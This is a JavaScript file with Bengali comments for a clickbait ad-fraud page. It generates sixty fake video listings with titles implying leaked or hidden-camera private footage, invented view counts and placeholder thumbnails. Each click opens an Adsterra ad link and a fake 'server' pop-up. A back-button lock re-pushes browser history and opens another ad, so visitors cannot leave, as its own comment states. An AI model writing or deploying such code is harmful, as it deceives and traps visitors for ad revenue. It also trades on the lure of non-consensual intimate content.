// ১. তোমার Adsterra Direct Link এখানে বসাও
const AD_LINK = "YOUR_ADSTERRA_DIRECT_LINK_HERE";

// ২. ভাইরাল টাইটেল দিয়ে ৬০টি ভিডিওর লিস্ট জেনারেট করার ফাংশন
const viralNames = [
    "Viral_Private_Clip", 
    "Hidden_Cam_Session", 
    "MMS_Trending_Now", 
    "Leaked_Full_HD", 
    "College_Secret_Vlog",
    "Hotel_Room_Secret",
    "Social_Media_Leak_2026",
    "Private_Party_Uncut"
];

function generateVideoGrid() {
    const grid = document.getElementById('video-grid');
    if (!grid) return;
    
    let html = '';
    
    for (let i = 1; i <= 60; i++) {
        // রেন্ডম ডাটা জেনারেশন
        const name = viralNames[Math.floor(Math.random() * viralNames.length)];
        const views = (Math.random() * (3.5 - 0.2) + 0.2).toFixed(1) + "M";
        const duration = Math.floor(Math.random() * 12) + ":" + Math.floor(Math.random() * 50 + 10);
        const randomThumbID = i + 100; // আলাদা আলাদা থাম্বনেইল এর জন্য

        html += `
            <div class="v-card" onclick="handleAdClick()">
                <div class="v-thumb" style="background-image: url('https://picsum.photos/seed/${randomThumbID}/200/120')">
                    <span class="v-duration">${duration}</span>
                </div>
                <div class="v-info">
                    <h4>${name}_Part_${i}_HD.mp4</h4>
                    <p>${views} views • ${i}h ago</p>
                </div>
            </div>`;
    }
    grid.innerHTML = html;
}

// ৩. অ্যাড ফাংশন (Custom Server Modal সহ)
function handleAdClick() {
    // নতুন ট্যাবে অ্যাড ওপেন হবে
    window.open(AD_LINK, '_blank'); 
    
    // কাস্টম সার্ভার মোডাল (পপ-আপ) দেখাবে
    const modal = document.getElementById('server-modal');
    if (modal) {
        modal.style.display = 'flex';
    }
}

// ৪. মোডাল বন্ধ করার ফাংশন
function closeModal() {
    const modal = document.getElementById('server-modal');
    if (modal) {
        modal.style.display = 'none';
    }
}

// ৫. Back Button Lock (ইউজার যেন সাইট থেকে বের হতে না পারে)
(function() {
    // হিস্টোরিতে একটি ফেক স্টেট পুশ করা
    window.history.pushState(null, null, window.location.href);
    
    window.onpopstate = function() {
        // ইউজার ব্যাক চাপলে আবার অ্যাড ওপেন হবে
        window.open(AD_LINK, '_blank');
        // তাকে আবার একই পেজে আটকে রাখা
        window.history.pushState(null, null, window.location.href);
    };
})();

// ৬. সাইট লোড হওয়ার সাথে সাথে ভিডিও গ্রিড তৈরি হবে
window.onload = function() {
    generateVideoGrid();
};
